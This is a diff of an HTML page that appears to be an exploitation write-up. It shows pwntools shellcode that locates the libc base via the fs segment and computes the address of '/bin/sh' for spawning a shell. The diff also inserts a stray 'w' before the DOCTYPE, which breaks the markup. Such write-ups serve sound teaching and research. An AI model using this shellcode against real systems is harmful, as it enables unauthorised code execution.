@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+w<!DOCTYPE html>
 <html>
   <head>
   <meta charset="utf-8">
@@ -545,7 +545,7 @@ shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span cla
 context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
 
 shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
-shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, fs:[0x0]"</span><span class="p">)</span><span class="c1">      # $rax = fs segment</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, fs:[0x0]"</span><span class="p">)</span><span class="c1">      # $rax = fs segment  </span><span class="p">
 shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, [rax + 0xb20]"</span><span class="p">)</span><span class="c1"> # $rax = libc base</span><span class="p">
 shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, rax"</span><span class="p">)</span><span class="c1">           # $rdi = libc base</span><span class="p">
 shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add rdi, 0x1d8678"</span><span class="p">)</span><span class="c1">      # $rdi = &"/bin/sh"</span><span class="p">
